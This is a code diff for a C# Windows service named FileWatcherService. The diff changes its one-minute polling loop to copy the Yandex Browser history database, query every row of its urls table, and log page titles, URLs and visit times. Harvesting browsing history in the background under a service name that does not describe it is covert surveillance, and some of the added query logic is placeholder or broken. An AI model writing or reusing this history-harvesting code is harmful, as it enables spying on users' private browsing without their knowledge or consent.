@@ -183,7 +183,7 @@ namespace FileWatcherService
         /// <summary>
         /// Копирование файла истории Yandex
         /// </summary>
-        private void readHistoryYandex()
+        private void copyHistoryYandex()
         {
             try
             {
@@ -282,8 +282,10 @@ namespace FileWatcherService
                 try
                 {
                     Thread.Sleep(60000);
-                    copyHistoryGoogle();
-                    ReadGoogleDataBase();
+                    //copyHistoryGoogle();
+                    copyHistoryYandex();
+                    ReadYandexDataBase();
+                    //ReadGoogleDataBase();
                     GC.Collect();
                 }
                 catch (Exception d)
@@ -292,7 +294,7 @@ namespace FileWatcherService
                     RecordEntry(d.Source);
                 }
 
-                //readHistoryYandex();
+                
                 //readHistoryFirefox();
                 //readHistoryOpera();
 
@@ -365,6 +367,89 @@ namespace FileWatcherService
                         }
 
                         //RecordEntry(stringBuilder.ToString());
+
+                        using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
+                        {
+                            f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                RecordEntry(ex.Message);
+            }
+        }
+
+
+
+
+        const string YandexdatabaseName = @"D:\\historyYandex.db";
+        private void ReadYandexDataBase()
+        {
+            try
+            {
+                
+                if (File.Exists(YandexdatabaseName))
+                {
+                    
+                    string lastTime = null;
+                    string tmpPath = "D:\\tmpYandex.txt";
+                    if (lastTime == null)
+                        lastTime = DateTime.Now.ToString();
+                    if (File.Exists(tmpPath))
+                    {
+                        
+                        using (FileStream f = new FileStream(tmpPath, FileMode.Open))
+                        {
+                            // преобразуем строку в байты
+                            byte[] array = new byte[f.Length];
+                            // считываем данные
+                            f.Read(array, 0, array.Length);
+                            // декодируем байты в строку
+                            lastTime = Encoding.Default.GetString(array);
+
+                        }
+                    }
+                    
+                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={YandexdatabaseName};")))
+                    {
+                        
+                        connection.Open();
+                        StringBuilder stringBuilder = new StringBuilder();
+                        
+                        DbDataReader r = null;
+                        
+                        if (DateTime.Parse(lastTime) < DateTime.Now)
+                        {
+                            
+                            r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();
+                      
+                        }
+                        else
+                        {
+                            
+                            RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
+                            //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
+                            r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();
+                           
+                        }
+                        if (r.HasRows)
+                        {
+                            
+                            while (r.Read())
+                            {
+                                stringBuilder.Append("title:\t");
+                                stringBuilder.Append(r.GetValue(2));
+                                stringBuilder.Append("\turl:\t");
+                                stringBuilder.Append(r.GetValue(1));
+                                stringBuilder.Append("\tlast time:\t");
+                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
+                                stringBuilder.Append("\r\n\r");
+                            }
+                        }
+
+                        RecordEntry(stringBuilder.ToString());
 
                         using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
                         {
